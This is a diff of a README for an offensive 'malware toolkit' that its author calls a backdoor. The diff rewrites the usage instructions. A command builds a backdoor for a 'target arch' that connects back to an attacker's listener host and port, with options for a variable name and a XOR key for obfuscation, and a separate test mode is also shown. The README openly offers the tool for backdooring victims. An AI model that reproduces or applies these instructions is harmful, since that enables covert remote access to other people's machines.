@@ -2,11 +2,18 @@
 
 This backdoor is an old draft that I decided to share. Don't expect perfects results if you plan to us it "as it".
 
-In order to use my malware toolkit you have first to install the ASCIIexzor suit. 
-Once it has been done, you can run two scripts :
+In order to use my malware toolkit you have first to install the ASCIIexzor suit. Once it has been done, you can run two scripts.
 
-* ASCIIexzorShell -a (victim arch) -h (host listener) -p (listener port [1337 - 50000]) [optional args][-v (varname) -k (xor key) (partially broken)]
-* ASCIIexzorShell-Test -a (arch) [optional args][-v (varname) -k (xor key) (partially broken)]
+for backdooring purposes :
+```bash
+ASCIIexzorShell -a <target arch> -h <host listener> -p <listen port ( 1337 - 50000 )> [optional args][-v <varname> -k <xor key>]
+```
+for testing purposes : 
+```bash
+ASCIIexzorShell-Test -a <target arch> [optional args][-v <varname> -k <xor key>]
+```
+
+***note : the -k option is partially broken. It's possible to use a custom key but sometimes the backdoor doesn't work.***
 
 My youtube video ( in french ) should give a clue how to use my malware toolkit. 
 
